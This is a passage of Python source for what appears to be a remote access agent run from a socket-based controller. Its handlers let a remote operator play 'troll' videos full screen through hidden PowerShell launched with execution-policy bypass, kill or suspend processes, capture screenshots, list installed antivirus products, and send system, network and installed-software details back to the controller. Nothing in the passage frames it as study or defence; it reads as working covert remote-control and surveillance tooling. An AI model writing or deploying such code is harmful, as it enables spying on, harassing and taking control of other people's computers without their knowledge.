            subprocess.Popen(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', s, p, str(duration_ms)], creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
        except Exception as e:
            log_message(f"Run script failed: {e}", "error")
    except Exception as e:
        try:
            log_message(f"Troll image ps error: {e}", "error")
        except Exception:
            pass

def on_troll_show_video(data):
    try:
        b64 = str((data or {}).get('video_b64') or '')
        filename = str((data or {}).get('filename') or 'troll.mp4')
        duration_ms = int((data or {}).get('duration_ms') or 8000)
        payload = base64.b64decode(b64)
        import tempfile
        import subprocess
        tmp_dir = tempfile.gettempdir()
        video_path = os.path.join(tmp_dir, filename)
        try:
            with open(video_path, 'wb') as f:
                f.write(payload)
        except Exception as e:
            log_message(f"Failed to write video: {e}", "error")
            return
        # Build minimal HTML to play full screen
        html = f"""
<!DOCTYPE html>
<html>
<head><meta charset=\"utf-8\"/><style>html,body{{margin:0;height:100%;background:#000}}video{{position:fixed;inset:0;width:100%;height:100%;object-fit:contain;background:#000}}</style></head>
<body>
<video id=\"v\" src=\"file:///{video_path.replace('\\\\', '/') }\" autoplay playsinline></video>
<script>const v=document.getElementById('v');v.requestFullscreen?.();</script>
</body>
</html>
"""
        html_path = os.path.join(tmp_dir, 'troll_video.html')
        try:
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html)
        except Exception as e:
            log_message(f"Failed to write HTML: {e}", "error")
            return
        # Try msedge fullscreen
        edge_paths = [
            r"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
            r"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        ]
        edge = None
        for p in edge_paths:
            if os.path.exists(p):
                edge = p
                break
        proc = None
        try:
            if edge:
                proc = subprocess.Popen([edge, '--start-fullscreen', html_path], creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
            else:
                os.startfile(html_path)
        except Exception as e:
            log_message(f"Failed to open viewer: {e}", "error")
            proc = None
        # Schedule close
        def _close():
            try:
                if proc and hasattr(proc, 'terminate'):
                    proc.terminate()
            except Exception:
                pass
            try:
                # Best-effort cleanup
                os.remove(video_path)
            except Exception:
                pass
        import threading, time as _t
        threading.Thread(target=lambda: (_t.sleep(max(1, duration_ms/1000)), _close()), daemon=True).start()
        try:
            safe_emit('agent_notification', {'id': f'nt_{int(time.time())}', 'type': 'info', 'title': 'Troll', 'message': f'Playing {filename}', 'timestamp': time.time(), 'agent_id': get_or_create_agent_id(), 'category': 'agent'})
        except Exception:
            pass
    except Exception as e:
        try:
            log_message(f"Troll video error: {e}", "error")
        except Exception:
            pass

def on_troll_show_video_ps(data):
    try:
        b64 = str((data or {}).get('video_b64') or '')
        filename = str((data or {}).get('filename') or 'troll.mp4')
        payload = base64.b64decode(b64)
        import tempfile
        p = os.path.join(tempfile.gettempdir(), filename)
        try:
            with open(p, 'wb') as f:
                f.write(payload)
        except Exception as e:
            log_message(f"Write video failed: {e}", "error")
            return
        script = """
Add-Type -AssemblyName PresentationFramework
$path = $args[0]
$w = New-Object Windows.Window
$w.WindowStyle = 'None'
$w.WindowState = 'Maximized'
$w.ResizeMode = 'NoResize'
$w.Topmost = $true
$w.ShowInTaskbar = $false
$w.Background = 'Black'
$m = New-Object Windows.Controls.MediaElement
$m.Source = $path
$m.LoadedBehavior = 'Play'
$m.UnloadedBehavior = 'Stop'
$m.Stretch = 'Uniform'
$m.Volume = 1.0
$m.Add_MediaEnded({ $w.Close() })
$w.Content = $m
$w.ShowDialog()
"""
        s = os.path.join(tempfile.gettempdir(), f"troll_video_{int(time.time())}.ps1")
        try:
            with open(s, 'w', encoding='utf-8') as f:
                f.write(script)
        except Exception as e:
            log_message(f"Write script failed: {e}", "error")
            return
        try:
            subprocess.Popen(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', s, p], creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
        except Exception as e:
            log_message(f"Run script failed: {e}", "error")
    except Exception as e:
        try:
            log_message(f"Troll video ps error: {e}", "error")
        except Exception:
            pass
class ProcessManager:
    def __init__(self, socket_client, agent_id):
        self.socket = socket_client
        self.agent_id = agent_id
        self.monitoring_active = False
        self.monitor_thread = None
        self.register_handlers()
    def register_handlers(self):
        @self.socket.on('list_processes')
        def handle_list_processes(data):
            try:
                procs = self.get_process_list()
                safe_emit('process_list', {'agent_id': self.agent_id, 'processes': procs})
            except Exception as e:
                safe_emit('process_list', {'agent_id': self.agent_id, 'processes': [], 'error': str(e)})
        @self.socket.on('kill_process')
        def handle_kill_process(data):
            pid = data.get('pid')
            force = bool(data.get('force'))
            try:
                success, message = self.kill_process(pid, force)
                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'kill', 'pid': pid, 'success': success, 'message': message})
            except Exception as e:
                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'kill', 'pid': pid, 'success': False, 'error': str(e)})
        @self.socket.on('suspend_process')
        def handle_suspend_process(data):
            pid = data.get('pid')
            try:
                success, message = self.suspend_process(pid)
                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'suspend', 'pid': pid, 'success': success, 'message': message})
            except Exception as e:
                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'suspend', 'pid': pid, 'success': False, 'error': str(e)})
        @self.socket.on('resume_process')
        def handle_resume_process(data):
            pid = data.get('pid')
            try:
                success, message = self.resume_process(pid)
                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'resume', 'pid': pid, 'success': success, 'message': message})
            except Exception as e:
                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'resume', 'pid': pid, 'success': False, 'error': str(e)})
        @self.socket.on('get_process_details')
        def handle_get_process_details(data):
            pid = data.get('pid')
            try:
                details = self.get_process_details(pid)
                safe_emit('process_details_response', {'agent_id': self.agent_id, 'pid': pid, 'details': details})
            except Exception as e:
                safe_emit('process_details_response', {'agent_id': self.agent_id, 'pid': pid, 'error': str(e)})
        @self.socket.on('start_process_monitor')
        def handle_start_monitor(data):
            interval = int(data.get('interval') or 2)
            self.start_monitoring(interval)
            safe_emit('monitor_status', {'agent_id': self.agent_id, 'monitoring': True, 'interval': interval})
        @self.socket.on('stop_process_monitor')
        def handle_stop_monitor(data):
            self.stop_monitoring()
            safe_emit('monitor_status', {'agent_id': self.agent_id, 'monitoring': False})
    def get_process_list(self):
        import psutil
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 'memory_percent', 'create_time', 'exe']):
            try:
                pinfo = proc.info
                processes.append({'pid': pinfo['pid'], 'name': pinfo['name'], 'username': pinfo.get('username') or 'N/A', 'status': pinfo.get('status') or 'running', 'cpu_percent': round(pinfo.get('cpu_percent') or 0, 2), 'memory_percent': round(pinfo.get('memory_percent') or 0, 2), 'created': _dt.fromtimestamp(pinfo['create_time']).isoformat() if pinfo.get('create_time') else None, 'exe': pinfo.get('exe') or 'N/A'})
            except Exception:
                continue
        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
        return processes
    def kill_process(self, pid, force=False):
        import psutil
        try:
            process = psutil.Process(int(pid))
            name = process.name()
            if force:
                process.kill()
            else:
                process.terminate()
            gone, alive = psutil.wait_procs([process], timeout=3)
            if alive:
                process.kill()
                gone, alive = psutil.wait_procs([process], timeout=2)
            if alive:
                return False, f"Failed to kill {name} (PID: {pid})"
            return True, f"Successfully killed {name} (PID: {pid})"
        except psutil.NoSuchProcess:
            return False, f"Process {pid} does not exist"
        except psutil.AccessDenied:
            return False, f"Access denied for process {pid}"
        except Exception as e:
            return False, f"Failed to kill process: {str(e)}"
    def suspend_process(self, pid):
        import psutil
        try:
            process = psutil.Process(int(pid))
            name = process.name()
            process.suspend()
            return True, f"Successfully suspended {name} (PID: {pid})"
        except psutil.NoSuchProcess:
            return False, f"Process {pid} does not exist"
        except psutil.AccessDenied:
            return False, f"Access denied for process {pid}"
        except Exception as e:
            return False, f"Failed to suspend process: {str(e)}"
    def resume_process(self, pid):
        import psutil
        try:
            process = psutil.Process(int(pid))
            name = process.name()
            process.resume()
            return True, f"Successfully resumed {name} (PID: {pid})"
        except psutil.NoSuchProcess:
            return False, f"Process {pid} does not exist"
        except psutil.AccessDenied:
            return False, f"Access denied for process {pid}"
        except Exception as e:
            return False, f"Failed to resume process: {str(e)}"
    def get_process_details(self, pid):
        import psutil
        try:
            process = psutil.Process(int(pid))
            details = {'pid': process.pid, 'name': process.name(), 'exe': process.exe(), 'cwd': process.cwd(), 'cmdline': ' '.join(process.cmdline()), 'status': process.status(), 'username': process.username(), 'created': _dt.fromtimestamp(process.create_time()).isoformat(), 'ppid': process.ppid(), 'parent_name': psutil.Process(process.ppid()).name() if process.ppid() else None}
            with process.oneshot():
                cpu_times = process.cpu_times()
                mem = process.memory_info()
                details['cpu'] = {'percent': process.cpu_percent(interval=0.1), 'user_time': cpu_times.user, 'system_time': cpu_times.system, 'num_threads': process.num_threads()}
                details['memory'] = {'percent': process.memory_percent(), 'rss': mem.rss, 'vms': mem.vms, 'rss_mb': round(mem.rss / (1024 * 1024), 2), 'vms_mb': round(mem.vms / (1024 * 1024), 2)}
                try:
                    io_counters = process.io_counters()
                    details['io'] = {'read_count': io_counters.read_count, 'write_count': io_counters.write_count, 'read_bytes': io_counters.read_bytes, 'write_bytes': io_counters.write_bytes}
                except Exception:
                    pass
                try:
                    open_files = process.open_files()
                    details['open_files'] = [f.path for f in open_files[:20]]
                except Exception:
                    details['open_files'] = []
                try:
                    connections = process.connections()
                    conns = []
                    for conn in connections[:20]:
                        conns.append({'fd': getattr(conn, 'fd', None), 'family': str(getattr(conn, 'family', None)), 'type': str(getattr(conn, 'type', None)), 'laddr': f"{getattr(conn.laddr, 'ip', '')}:{getattr(conn.laddr, 'port', '')}" if getattr(conn, 'laddr', None) else None, 'raddr': f"{getattr(conn.raddr, 'ip', '')}:{getattr(conn.raddr, 'port', '')}" if getattr(conn, 'raddr', None) else None, 'status': getattr(conn, 'status', None)})
                    details['connections'] = conns
                except Exception:
                    details['connections'] = []
            return details
        except psutil.NoSuchProcess:
            raise Exception(f"Process {pid} does not exist")
        except psutil.AccessDenied:
            raise Exception(f"Access denied for process {pid}")
        except Exception as e:
            raise Exception(f"Failed to get process details: {str(e)}")
    def start_monitoring(self, interval):
        import psutil, threading
        if self.monitoring_active:
            return
        self.monitoring_active = True
        def monitor_loop():
            while self.monitoring_active:
                try:
                    processes = []
                    for proc in psutil.process_iter(['pid','name','cpu_percent','memory_percent']):
                        try:
                            info = proc.info
                            processes.append({'pid': info['pid'], 'name': info['name'], 'cpu_percent': round(info.get('cpu_percent') or 0, 2), 'memory_percent': round(info.get('memory_percent') or 0, 2)})
                        except Exception:
                            continue
                    processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
                    top = processes[:20]
                    cpu_percent = psutil.cpu_percent(interval=None)
                    memory = psutil.virtual_memory()
                    safe_emit('process_monitor_update', {'agent_id': self.agent_id, 'timestamp': time.time(), 'system': {'cpu_percent': cpu_percent, 'memory_percent': memory.percent, 'memory_available_mb': round(memory.available / (1024 * 1024), 2)}, 'top_processes': top})
                except Exception:
                    pass
                time.sleep(interval)
        self.monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        self.monitor_thread.start()
    def stop_monitoring(self):
        self.monitoring_active = False

class SystemInfoGatherer:
    def __init__(self, socket_client, agent_id):
        self.socket = socket_client
        self.agent_id = agent_id
        self.register_handlers()
        print(f"[INFO] SystemInfoGatherer initialized for agent {agent_id}")

    def register_handlers(self):
        @self.socket.on('get_system_info')
        def handle_get_system_info(data):
            level = str(data.get('detail_level') or 'full').lower()
            try:
                if level == 'basic':
                    info = self.get_basic_info()
                elif level == 'standard':
                    info = self.get_standard_info()
                else:
                    info = self.get_full_info()
                safe_emit('system_info_response', {'agent_id': self.agent_id, 'info': info, 'detail_level': level, 'success': True})
            except Exception as e:
                safe_emit('system_info_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
        @self.socket.on('get_network_info')
        def handle_get_network_info(data):
            try:
                info = self.get_network_info()
                safe_emit('network_info_response', {'agent_id': self.agent_id, 'info': info, 'success': True})
            except Exception as e:
                safe_emit('network_info_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
        @self.socket.on('get_installed_software')
        def handle_get_software(data):
            try:
                software = self.get_installed_software()
                safe_emit('installed_software_response', {'agent_id': self.agent_id, 'software': software, 'count': len(software), 'success': True})
            except Exception as e:
                safe_emit('installed_software_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
        
        @self.socket.on('get_hardware_info')
        def handle_get_hardware_info(data):
            """Get comprehensive hardware inventory information"""
            try:
                hardware = self.get_hardware_inventory()
                safe_emit('hardware_info_response', {'agent_id': self.agent_id, 'hardware': hardware, 'success': True})
            except Exception as e:
                safe_emit('hardware_info_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})

        @self.socket.on('get_screenshot')
        def handle_get_screenshot(data):
            """Capture and return a single screenshot with enhanced error handling."""
            try:
                debug_enabled = False
                import os
                import json
                import datetime
                from screenshot_accuracy import build_screenshot_metrics
                origin_sid = None

                debug_enabled = os.getenv("SCREENSHOT_DEBUG") == "1" or os.getenv("ENV") == "development"
                def log_event(event_type: str, message: str, **extra):
                    payload = {"timestamp": datetime.datetime.utcnow().isoformat() + "Z", "event": event_type, "message": message}
                    payload.update(extra)
                    print(f"[Screenshot] {json.dumps(payload, ensure_ascii=False)}")

                print(f"[Screenshot] Received screenshot request, agent ID: {self.agent_id}")
                log_event("request", "Screenshot request received", agent_id=self.agent_id)
                
                # Validate input data
                if not data or not isinstance(data, dict):
                    raise Exception("Invalid screenshot request data")
                
                # Validate agent ID
                request_agent_id = data.get('agent_id')
                origin_sid = data.get('origin_sid')
                if not request_agent_id or request_agent_id != self.agent_id:
                    print(f"[Screenshot] Request not for current agent (request: {request_agent_id}, current: {self.agent_id})")
                    log_event("skip", "Screenshot request ignored for different agent", request_agent_id=request_agent_id, agent_id=self.agent_id)
                    return
                
                print("[Screenshot] Starting screen capture...")
                log_event("start", "Screenshot capture started", agent_id=self.agent_id)
                if debug_enabled:
                    breakpoint()
                
                # Try to capture screen (up to 3 retries)
                screenshot_data = None
                last_error = None
                attempts_used = 0
                capture_start = time.time()
                
                for attempt in range(3):
                    try:
                        print(f"[Screenshot] Attempt {attempt + 1}/3")
                        attempts_used = attempt + 1
                        log_event("attempt", "Screenshot capture attempt", attempt=attempts_used)
                        screenshot_data = self.capture_screen_base64()
                        
                        # Validate screenshot data
                        if screenshot_data and len(screenshot_data) > 50:
                            print(f"[Screenshot] Successfully captured screen, data size: {len(screenshot_data)} characters")
                            break
                        else:
                            raise Exception("Screenshot data too small or invalid")
                            
                    except Exception as e:
                        last_error = str(e)
                        print(f"[Screenshot] Attempt {attempt + 1} failed: {last_error}")
                        log_event("attempt_failed", "Screenshot attempt failed", attempt=attempts_used, error=last_error)
                        
                        if attempt < 2:  # Not the last attempt
                            import time
                            time.sleep(0.5)  # Wait half second then retry
                        else:
                            raise  # Last attempt, throw exception
                
                if screenshot_data:
                    duration_ms = int((time.time() - capture_start) * 1000)
                    image_size = len(screenshot_data)
                    metrics = build_screenshot_metrics(
                        success=True,
                        duration_ms=duration_ms,
                        size=image_size,
                        attempts=attempts_used,
                    )
                    print("[Screenshot] Screenshot capture successful, sending response...")
                    safe_emit('screenshot_response', {
                        'agent_id': self.agent_id, 
                        'image': screenshot_data, 
                        'success': True,
                        'duration_ms': metrics.get("duration_ms"),
                        'attempts': metrics.get("attempts"),
                        'image_size': metrics.get("image_size"),
                        'accuracy': metrics.get("accuracy"),
                        'timestamp': int(time.time() * 1000),
                        'target_sid': origin_sid
                    })
                    log_event("success", "Screenshot response sent", duration_ms=metrics.get("duration_ms"), attempts=metrics.get("attempts"), image_size=metrics.get("image_size"), accuracy=metrics.get("accuracy"))
                    print("[Screenshot] Response sending completed")
                else:
                    raise Exception(last_error or "Screenshot capture failed")
                    
            except Exception as e:
                error_msg = f"Screenshot capture failed: {str(e)}"
                duration_ms = None
                try:
                    duration_ms = int((time.time() - capture_start) * 1000)
                except Exception:
                    duration_ms = None
                metrics = None
                try:
                    from screenshot_accuracy import build_screenshot_metrics
                    metrics = build_screenshot_metrics(
                        success=False,
                        duration_ms=duration_ms,
                        size=0,
                        attempts=attempts_used if 'attempts_used' in locals() else 1,
                        error=error_msg,
                    )
                except Exception:
                    metrics = {"accuracy": 0.0, "duration_ms": duration_ms or 0, "image_size": 0, "attempts": attempts_used if 'attempts_used' in locals() else 1}
                print(f"[Screenshot] Error: {error_msg}")
                try:
                    log_event("error", "Screenshot capture failed", error=error_msg, duration_ms=metrics.get("duration_ms") if metrics else None, accuracy=metrics.get("accuracy") if metrics else None)
                except Exception:
                    pass
                if debug_enabled:
                    breakpoint()
                safe_emit('screenshot_response', {
                    'agent_id': self.agent_id, 
                    'error': error_msg, 
                    'success': False,
                    'duration_ms': metrics.get("duration_ms") if metrics else duration_ms,
                    'attempts': metrics.get("attempts") if metrics else attempts_used if 'attempts_used' in locals() else 1,
                    'image_size': metrics.get("image_size") if metrics else 0,
                    'accuracy': metrics.get("accuracy") if metrics else 0,
                    'timestamp': int(time.time() * 1000),
                    'target_sid': origin_sid
                })
    def get_basic_info(self):
        return {'hostname': socket.gethostname(), 'platform': platform.system(), 'platform_release': platform.release(), 'architecture': platform.machine(), 'processor': platform.processor(), 'username': os.getenv('USERNAME') or os.getenv('USER'), 'timestamp': datetime.datetime.now().isoformat()}
    def get_standard_info(self):
        info = self.get_basic_info()
        try:
            import psutil
            cpu_freq = psutil.cpu_freq()
            info['cpu'] = {'physical_cores': psutil.cpu_count(logical=False), 'logical_cores': psutil.cpu_count(logical=True), 'current_freq_mhz': cpu_freq.current if cpu_freq else None, 'usage_percent': psutil.cpu_percent(interval=0.5)}
            memory = psutil.virtual_memory()
            info['memory'] = {'total_gb': round(memory.total / (1024**3), 2), 'available_gb': round(memory.available / (1024**3), 2), 'used_gb': round(memory.used / (1024**3), 2), 'percent': memory.percent}
            disk = psutil.disk_usage(os.path.abspath(os.sep))
            info['disk'] = {'total_gb': round(disk.total / (1024**3), 2), 'used_gb': round(disk.used / (1024**3), 2), 'free_gb': round(disk.free / (1024**3), 2), 'percent': disk.percent}
        except Exception:
            pass
        return info
    def get_full_info(self):
        info = self.get_standard_info()
        try:
            import cpuinfo
            cpu_info = cpuinfo.get_cpu_info()
            c = info.setdefault('cpu', {})
            c['brand'] = cpu_info.get('brand_raw')
            c['vendor'] = cpu_info.get('vendor_id_raw')
            flags = cpu_info.get('flags') or []
            c['flags'] = flags[:20]
        except Exception:
            pass
        try:
            import psutil
            parts = []
            for p in psutil.disk_partitions():
                try:
                    u = psutil.disk_usage(p.mountpoint)
                    parts.append({'device': p.device, 'mountpoint': p.mountpoint, 'fstype': p.fstype, 'total_gb': round(u.total / (1024**3), 2), 'used_gb': round(u.used / (1024**3), 2), 'free_gb': round(u.free / (1024**3), 2), 'percent': u.percent})
                except Exception:
                    continue
            info['disk_partitions'] = parts
            nets = []
            for name, addrs in psutil.net_if_addrs().items():
                ni = {'name': name, 'addresses': []}
                for a in addrs:
                    ni['addresses'].append({'family': str(getattr(a, 'family', '')), 'address': getattr(a, 'address', ''), 'netmask': getattr(a, 'netmask', None), 'broadcast': getattr(a, 'broadcast', None)})
                nets.append(ni)
            info['network_interfaces'] = nets
            bt = datetime.datetime.fromtimestamp(psutil.boot_time())
            info['boot_time'] = bt.isoformat()
            info['uptime_seconds'] = (datetime.datetime.now() - bt).total_seconds()
        except Exception:
            pass
        try:
            if platform.system() == 'Windows':
                info['windows'] = self.get_windows_specific_info()
            elif platform.system() == 'Linux':
                info['linux'] = self.get_linux_specific_info()
        except Exception:
            pass
        return info
    def get_windows_specific_info(self):
        w = {}
        try:
            r = subprocess.run(['wmic', 'os', 'get', 'Caption,Version,BuildNumber', '/format:list'], capture_output=True, text=True, timeout=5)
            for line in (r.stdout or '').split('\n'):
                if '=' in line:
                    k, v = line.split('=', 1)
                    w[k.strip().lower()] = v.strip()
            r2 = subprocess.run(['wmic', 'computersystem', 'get', 'Domain', '/format:list'], capture_output=True, text=True, timeout=5)
            for line in (r2.stdout or '').split('\n'):
                if 'Domain=' in line:
                    w['domain'] = line.split('=')[1].strip()
            r3 = subprocess.run(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntivirusProduct', 'get', 'displayName', '/format:list'], capture_output=True, text=True, timeout=5)
            av = []
            for line in (r3.stdout or '').split('\n'):
                if 'displayName=' in line:
                    nm = line.split('=')[1].strip()
                    if nm:
                        av.append(nm)
            w['antivirus'] = av
        except Exception:
            pass
        return w
    def get_linux_specific_info(self):
        l = {}
        try:
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if '=' in line:
                        k, v = line.strip().split('=', 1)
                        l[k.lower()] = v.strip('"')
            l['kernel'] = platform.release()
        except Exception:
            pass
        return l
    def get_network_info(self):
        info = {'hostname': socket.gethostname(), 'fqdn': socket.getfqdn(), 'interfaces': [], 'connections': [], 'stats': {}}
        try:
            import psutil
            for name, addrs in psutil.net_if_addrs().items():
                ii = {'name': name, 'addresses': [], 'stats': None}
                for a in addrs:
                    ai = {'family': str(getattr(a, 'family', '')), 'address': getattr(a, 'address', '')}
                    if getattr(a, 'family', None) == socket.AF_INET:
                        ai['netmask'] = getattr(a, 'netmask', None)
                        ai['broadcast'] = getattr(a, 'broadcast', None)
                    ii['addresses'].append(ai)
                try:
                    s = psutil.net_if_stats().get(name)
                    if s:
                        ii['stats'] = {'isup': s.isup, 'speed_mbps': s.speed, 'mtu': s.mtu}
                except Exception:
                    pass
                info['interfaces'].append(ii)
            try:
                for conn in psutil.net_connections(kind='inet'):
                    if conn.status == 'ESTABLISHED':
                        info['connections'].append({'local_address': f"{getattr(conn.laddr, 'ip', '')}:{getattr(conn.laddr, 'port', '')}" if getattr(conn, 'laddr', None) else None, 'remote_address': f"{getattr(conn.raddr, 'ip', '')}:{getattr(conn.raddr, 'port', '')}" if getattr(conn, 'raddr', None) else None, 'status': conn.status, 'pid': conn.pid})
            except Exception:
                pass
            nio = psutil.net_io_counters()
            info['stats'] = {'bytes_sent': nio.bytes_sent, 'bytes_recv': nio.bytes_recv, 'packets_sent': nio.packets_sent, 'packets_recv': nio.packets_recv, 'errin': nio.errin, 'errout': nio.errout, 'dropin': nio.dropin, 'dropout': nio.dropout}
        except Exception:
            pass
        return info
    def get_installed_software(self):
        software = []
        try:
            if platform.system() == 'Windows':
                import winreg
                paths = [(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'), (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'), (winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')]
                for hive, path in paths:
                    try:
                        key = winreg.OpenKey(hive, path)
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                subkey = winreg.OpenKey(key, subkey_name)
                                try:
                                    name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                                    version = None
                                    publisher = None
                                    install_date = None
                                    try:
                                        version = winreg.QueryValueEx(subkey, 'DisplayVersion')[0]
                                    except Exception:
                                        pass
                                    try:
                                        publisher = winreg.QueryValueEx(subkey, 'Publisher')[0]
                                    except Exception:
                                        pass
                                    try:
                                        install_date = winreg.QueryValueEx(subkey, 'InstallDate')[0]
                                    except Exception:
                                        pass
                                    software.append({'name': name, 'version': version, 'publisher': publisher, 'install_date': install_date})
                                except Exception:
                                    pass
                                winreg.CloseKey(subkey)
                            except Exception:
                                continue
                        winreg.CloseKey(key)
                    except Exception:
                        continue
            elif platform.system() == 'Linux':
                try:
                    r = subprocess.run(['dpkg', '-l'], capture_output=True, text=True, timeout=10)
                    for line in (r.stdout or '').split('\n')[5:]:
                        if line.strip():
                            parts = line.split()
                            if len(parts) >= 3:
                                software.append({'name': parts[1], 'version': parts[2], 'description': ' '.join(parts[3:]) if len(parts) > 3 else None})
                except Exception:
                    pass
                if not software:
                    try:
                        r2 = subprocess.run(['rpm', '-qa', '--queryformat', '%{NAME}|%{VERSION}|%{RELEASE}\n'], capture_output=True, text=True, timeout=10)
                        for line in (r2.stdout or '').split('\n'):
                            if '|' in line:
                                parts = line.split('|')
                                software.append({'name': parts[0], 'version': f"{parts[1]}-{parts[2]}" if len(parts) > 2 else parts[1]})
                    except Exception:
                        pass
            elif platform.system() == 'Darwin':
                try:
                    r = subprocess.run(['system_profiler', 'SPApplicationsDataType', '-json'], capture_output=True, text=True, timeout=15)
                    data = json.loads(r.stdout or '{}')
                    apps = data.get('SPApplicationsDataType', [])
                    for app in apps:
                        software.append({'name': app.get('_name'), 'version': app.get('version'), 'publisher': app.get('obtained_from')})
                except Exception:
                    pass
        except Exception:
            pass
        seen = set()
        unique = []
        for item in software:
            nm = item.get('name')
            if nm and nm not in seen:
                seen.add(nm)
                unique.append(item)
        unique.sort(key=lambda x: (x.get('name') or '').lower())
        return unique

    def get_hardware_inventory(self):
        """Get comprehensive hardware inventory information"""
        hardware = {}
        
        try:
            import psutil
            import platform
            import subprocess
            import socket
            
            # CPU Information
            try:
                cpu_info = {
                    'name': platform.processor() or 'Unknown',
                    'cores': psutil.cpu_count(logical=False) or 0,
                    'threads': psutil.cpu_count(logical=True) or 0,
                    'frequency': 0,
                    'architecture': platform.machine(),
                    'vendor': 'Unknown'
                }
                
                # Get CPU frequency
                freq = psutil.cpu_freq()
                if freq:
                    cpu_info['frequency'] = freq.current
                
                # Get detailed CPU info on Windows
                if platform.system() == 'Windows':
                    try:
                        result = subprocess.run(['wmic', 'cpu', 'get', 'Name,Manufacturer,MaxClockSpeed', '/format:list'], 
                                              capture_output=True, text=True, timeout=5)
                        for line in result.stdout.split('\n'):
                            if '=' in line:
                                key, value = line.split('=', 1)
                                if 'Name' in key and value.strip():
                                    cpu_info['name'] = value.strip()
                                elif 'Manufacturer' in key and value.strip():
                                    cpu_info['vendor'] = value.strip()
                                elif 'MaxClockSpeed' in key and value.strip():
                                    cpu_info['frequency'] = float(value.strip())
                    except Exception:
                        pass
                
                hardware['cpu'] = cpu_info
            except Exception:
                pass
            
            # Memory Information
            try:
                memory = psutil.virtual_memory()
                hardware['memory'] = {
                    'total': memory.total,
                    'available': memory.available,
                    'used': memory.used,
                    'type': 'DDR4',  # Default, would need more detailed detection
                    'speed': 0
                }
                
                # Get memory info on Windows
                if platform.system() == 'Windows':
                    try:
                        result = subprocess.run(['wmic', 'memorychip', 'get', 'Speed,Capacity', '/format:list'], 
                                              capture_output=True, text=True, timeout=5)
                        total_capacity = 0
                        max_speed = 0
                        for line in result.stdout.split('\n'):
                            if '=' in line:
                                key, value = line.split('=', 1)
                                if 'Capacity' in key and value.strip():
                                    total_capacity += int(value.strip())
                                elif 'Speed' in key and value.strip():
                                    speed = int(value.strip())
                                    if speed > max_speed:
                                        max_speed = speed
                        
                        if total_capacity > 0:
                            hardware['memory']['total'] = total_capacity
                        if max_speed > 0:
                            hardware['memory']['speed'] = max_speed
                    except Exception:
                        pass
            except Exception:
                pass
            
            # Storage Information
            try:
                storage_devices = []
                for partition in psutil.disk_partitions():
                    try:
                        usage = psutil.disk_usage(partition.mountpoint)
                        device_info = {
                            'name': partition.device,
                            'size': usage.total,
                            'type': partition.fstype,
                            'interface': 'SATA',  # Default, would need more detection
                            'health': 'Good' if usage.percent < 90 else 'Warning'
                        }
                        storage_devices.append(device_info)
                    except Exception:
                        continue
                
                # Get storage info on Windows
                if platform.system() == 'Windows':
                    try:
                        result = subprocess.run(['wmic', 'diskdrive', 'get', 'Model,Size,InterfaceType', '/format:list'], 
                                              capture_output=True, text=True, timeout=5)
                        for line in result.stdout.split('\n'):
                            if '=' in line:
                                key, value = line.split('=', 1)
                                if 'Model' in key and value.strip():
                                    # Try to match with existing devices
                                    for device in storage_devices:
                                        if device['name'] in value.strip() or value.strip() in device['name']:
                                            device['name'] = value.strip()
                                elif 'InterfaceType' in key and value.strip():
                                    for device in storage_devices:
                                        device['interface'] = value.strip()
                    except Exception:
                        pass
                
                hardware['storage'] = storage_devices[:5]  # Limit to first 5 devices
            except Exception:
                pass
            
            # GPU Information
            try:
                gpu_devices = []
                
                # Get GPU info on Windows
                if platform.system() == 'Windows':
                    try:
                        result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'Name,AdapterRAM,DriverVersion', '/format:list'], 
                                              capture_output=True, text=True, timeout=5)
                        current_gpu = {}
                        for line in result.stdout.split('\n'):
                            if '=' in line:
                                key, value = line.split('=', 1)
                                if 'Name' in key and value.strip():
                                    if current_gpu:
                                        gpu_devices.append(current_gpu)
                                    current_gpu = {
                                        'name': value.strip(),
                                        'memory': 0,
                                        'driver': 'Unknown',
                                        'vendor': 'Unknown'
                                    }
                                elif 'AdapterRAM' in key and value.strip():
                                    current_gpu['memory'] = int(value.strip())
                                elif 'DriverVersion' in key and value.strip():
                                    current_gpu['driver'] = value.strip()
                        
                        if current_gpu:
                            gpu_devices.append(current_gpu)
                    except Exception:
                        pass
                
                # Fallback to basic detection
                if not gpu_devices:
                    try:
                        # Try to detect from platform info
                        gpu_name = 'Integrated Graphics'
                        if 'NVIDIA' in platform.processor().upper():
                            gpu_name = 'NVIDIA Graphics'
                        elif 'AMD' in platform.processor().upper():
                            gpu_name = 'AMD Graphics'
                        elif 'INTEL' in platform.processor().upper():
                            gpu_name = 'Intel Graphics'
                        
                        gpu_devices.append({
                            'name': gpu_name,
                            'memory': 0,
                            'driver': 'Unknown',
                            'vendor': 'Unknown'
